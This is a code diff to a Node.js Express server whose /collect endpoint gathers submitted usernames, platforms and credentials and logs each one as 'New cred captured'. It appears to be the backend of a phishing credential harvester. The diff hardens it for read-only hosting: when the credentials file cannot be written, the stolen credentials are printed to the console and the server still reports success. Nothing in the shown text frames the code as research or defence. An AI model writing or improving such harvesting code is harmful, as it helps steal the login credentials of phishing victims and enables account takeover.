@@ -10,8 +10,12 @@ app.use(express.static("public")); // Serve your HTML from /public folder
 const credsFile = path.join(__dirname, "credentials.json");
 
 // Ensure file exists
-if (!fs.existsSync(credsFile)) {
-  fs.writeFileSync(credsFile, JSON.stringify([], null, 2));
+try {
+  if (!fs.existsSync(credsFile)) {
+    fs.writeFileSync(credsFile, JSON.stringify([], null, 2));
+  }
+} catch (err) {
+  console.log("Could not create credentials file (likely read-only fs), skipping initialization.");
 }
 
 // Collect credentials endpoint
@@ -40,6 +44,11 @@ app.post("/collect", (req, res) => {
       console.log(`🆕 New cred captured: ${username} | ${platform}`);
       res.json({ success: true, message: "Received" });
     } catch (err) {
+      if (err.code === 'EROFS') {
+        console.log(`⚠️ Read-only filesystem detected. Logging credentials instead:`);
+        console.log(JSON.stringify(cred, null, 2));
+        return res.json({ success: true, message: "Received (Logged to console)" });
+      }
       console.error("Error saving credentials:", err);
       res.status(500).json({ error: "Failed to save data" });
     }
